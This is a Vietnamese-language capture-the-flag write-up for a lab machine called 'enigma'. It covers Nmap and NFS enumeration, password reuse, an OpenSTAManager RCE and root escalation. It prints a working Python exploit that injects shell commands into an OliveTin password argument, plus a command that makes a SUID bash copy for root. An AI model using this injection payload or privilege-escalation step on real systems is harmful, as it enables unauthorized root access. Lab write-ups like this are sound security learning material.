


# Véc tơ tấn công

www-data: Nmap -> NFS enumeration -> kevins credentials -> web enumeration -> sarah reuse default passwords -> subdomain discovered-> OpenSTAManager 2.9.8 -> RCE exploit -> www-data

haris: System Enumeration -> DB credentials -> DB enumeration -> haris passwords -> crack the hash -> haris credentials -> shell as haris

root: system enumeration ->  oliverTin 3000.10.0 running at port 1337 -> DB OS command injection -> create SUID binary -> root.


# Nmap Enumeration

```
# Nmap 7.95 scan initiated Mon Oct 19 13:48:05 2026 as: nmap -sC -sV -oN enigma.nmap 10.129.40.157
Nmap scan report for 10.129.40.157
Host is up (0.082s latency).
Not shown: 992 closed tcp ports (conn-refused)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp   open  http     nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://enigma.htb/
110/tcp  open  pop3     Dovecot pop3d
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=enigma
| Subject Alternative Name: DNS:enigma
| Not valid before: 2026-02-18T20:33:33
|_Not valid after:  2036-02-16T20:33:33
|_pop3-capabilities: SASL AUTH-RESP-CODE RESP-CODES STLS PIPELINING TOP UIDL CAPA
111/tcp  open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      37465/udp6  mountd
|   100005  1,2,3      39913/tcp6  mountd
|   100005  1,2,3      42501/udp   mountd
|   100005  1,2,3      57491/tcp   mountd
|   100021  1,3,4      35425/tcp   nlockmgr
|   100021  1,3,4      40309/tcp6  nlockmgr
|   100021  1,3,4      44238/udp6  nlockmgr
|   100021  1,3,4      54603/udp   nlockmgr
|   100024  1          36745/udp   status
|   100024  1          42577/tcp   status
|   100024  1          47412/udp6  status
|   100024  1          55983/tcp6  status
|   100227  3           2049/tcp   nfs_acl
|_  100227  3           2049/tcp6  nfs_acl
143/tcp  open  imap     Dovecot imapd (Ubuntu)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=enigma
| Subject Alternative Name: DNS:enigma
| Not valid before: 2026-02-18T20:33:33
|_Not valid after:  2036-02-16T20:33:33
|_imap-capabilities: LOGINDISABLEDA0001 have LOGIN-REFERRALS post-login IMAP4rev1 listed OK capabilities LITERAL+ ID Pre-login IDLE ENABLE SASL-IR STARTTLS more
993/tcp  open  ssl/imap Dovecot imapd (Ubuntu)
|_imap-capabilities: OK LOGIN-REFERRALS have IMAP4rev1 post-login AUTH=PLAINA0001 listed LITERAL+ ID capabilities IDLE ENABLE SASL-IR Pre-login more
| ssl-cert: Subject: commonName=enigma
| Subject Alternative Name: DNS:enigma
| Not valid before: 2026-02-18T20:33:33
|_Not valid after:  2036-02-16T20:33:33
|_ssl-date: TLS randomness does not represent time
995/tcp  open  ssl/pop3 Dovecot pop3d
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=enigma
| Subject Alternative Name: DNS:enigma
| Not valid before: 2026-02-18T20:33:33
|_Not valid after:  2036-02-16T20:33:33
|_pop3-capabilities: SASL(PLAIN) AUTH-RESP-CODE RESP-CODES PIPELINING USER TOP UIDL CAPA
2049/tcp open  nfs_acl  3 (RPC #100227)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Oct 19 13:48:42 2026 -- 1 IP address (1 host up) scanned in 36.69 seconds
```


- Nhận xét về host:
	- cổng 22 mở SSH không làm gì cả
	- cổng 111 và 2049: chúng ta có thể thấy NFS đang mở
	- cổng 143,110,995,994: các mail services đang mở
	- Cổng 80 chạy nginx với host là ubuntu và có hostname là enigma.htb



Lưu DNS![[Pasted image 20261019135753.png]]


# NFS enumeration

![[Pasted image 20261019135921.png]]

chúng ta có 1 mount thú vị là /srv/nfs/onboarding *

ta mount vào và tìm được các file cần thiết đi về
![[Pasted image 20261019140456.png]]

![[Pasted image 20261019140616.png]]

về cơ bản chúng ta có credentials kevin:Enigma2024! và subdomain mail001.enigma.htb


lưu lại
![[Pasted image 20261019141624.png]]
# Web Enumeration

![[Pasted image 20261019142308.png]]

Chúng ta nhận được email với username sarah và phân tích đoạn văn trên thì có thể chúng ta thử password spray

và chúng ta tìm được credentials bằng cách reuse passwords: sarah:Enigma2024!

![[Pasted image 20261019142546.png]]

đọc thư này ta thấy được
- Credentials: admin:Ne3s4rtars78s
- domain: support_001.enigma.htb


Lưu host
![[Pasted image 20261019142931.png]]



sử dụng credentials ở trên và vào
![[Pasted image 20261019143043.png]]


ta thấy được vhost đang chạy OpenSTAManager 2.9.8


# shell as www-data

Tra cứu trên mạng nó bị lỗ hổng https://github.com/b0ySie7e/OpenSTAManager-RCE-Exploit-CVE-2026-38751 về cơ bản là lỗ hổng file_upload khiến cho việc hacker có thể gửi file zip đóng gói với malicious php code khiến cho trang web thực hiện mã độc và tạo webshell trên máy nạn nhân từ đó gain được reverse shell


![[Pasted image 20261019144624.png]]

sử dụng script trên chúng ta đã có shell của www-data



![[Pasted image 20261019145143.png]]
chúng ta về cơ bản có database credentials brollin:Fri3nds@9099


![[Pasted image 20261019145838.png]]
Sau khi enumerate database thì chúng ta có 2 credential mà password bị mã hóa bcrypy mode 3200 trong hash cat


![[Pasted image 20261019150141.png]]

decrypt nó và ta có được credentials haris:bestfriends


# shell as haris

- sử dụng credentials trên su haris và vào được haris shell




# shell as root

![[Pasted image 20261019151045.png]]

cổng 1337 bất thường đang chạy dịch vụ gì đó
![[Pasted image 20261019151200.png]]

và nó chạy OliverTin 3000.10.0. Phiên bản này bị  OliveTin: OS Command Injection via `password` argument type and webhook JSON extraction bypasses shell safety checks CVE-2026-27626

tức là olivertin có thể thực hiện command injection bằng cách tiêm vào password argument từ đó database thục hiện OS command này và chiến được quyền root

![[Pasted image 20261019151239.png]]




sử dụng script này trên máy attacker
```python

#!/usr/bin/env python3

import argparse
import json
import sys
import uuid
import time

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def start_action(base_url, tracking_id, cmd):
    url = f"{base_url}/api/olivetin.api.v1.OliveTinApiService/StartAction"

    payload = {
        "bindingId": "backup_database",
        "arguments": [
            {
                "name": "db_user",
                "value": "backup_svc"
            },
            {
                "name": "db_pass",
                "value": f"';{cmd};'"
            },
            {
                "name": "db_name",
                "value": "production"
            }
        ],
        "uniqueTrackingId": tracking_id
    }

    r = requests.post(
        url,
        json=payload,
        verify=False,
        timeout=10,
    )

    r.raise_for_status()

    return r.json()["executionTrackingId"]


def execution_status(base_url, tracking_id):
    url = f"{base_url}/api/olivetin.api.v1.OliveTinApiService/ExecutionStatus"

    payload = {
        "executionTrackingId": tracking_id
    }

    r = requests.post(
        url,
        json=payload,
        verify=False,
        timeout=10,
    )

    r.raise_for_status()
    return r.json()


def print_output(resp):
    try:
        output = resp["logEntry"]["output"]
    except KeyError:
        print(json.dumps(resp, indent=4))
        return

    print("=" * 70)
    print("Command Output")
    print("=" * 70)
    print(output.rstrip())
    print("=" * 70)


def main():
    parser = argparse.ArgumentParser(
        description="OliveTin HTB PoC"
    )

    parser.add_argument(
        "-u",
        "--url",
        required=True,
        help="Target host/IP"
    )

    parser.add_argument(
        "-p",
        "--port",
        default=1337,
        type=int,
        help="Target port (default: 1337)"
    )

    parser.add_argument(
        "-x",
        "--cmd",
        default="id",
        help="Command to execute (default: id)"
    )

    args = parser.parse_args()

    host = args.url.rstrip("/")

    if not host.startswith("http://") and not host.startswith("https://"):
        host = "http://" + host

    base_url = f"{host}:{args.port}"

    tracking_id = str(uuid.uuid4())

    try:
        execution_id = start_action(base_url, tracking_id, args.cmd)

        print(f"[+] Execution ID: {execution_id}")
        time.sleep(2)
        response = execution_status(base_url, execution_id)

        print_output(response)

    except requests.exceptions.RequestException as e:
        print(f"[-] Request failed: {e}")
        sys.exit(1)
    except Exception as e:
        print(f"[-] Error: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()
```

Đánh ```

```
python3 exploit.py(script trên) -u http://127.0.0.1 -p 1337 -x 'cp /bin/bash /tmp/pwn; chmod u+s /tmp/pwn'
 
```


thế là ta có binary
![[Pasted image 20261019151711.png]]


/tmp/pwn -p => lên root



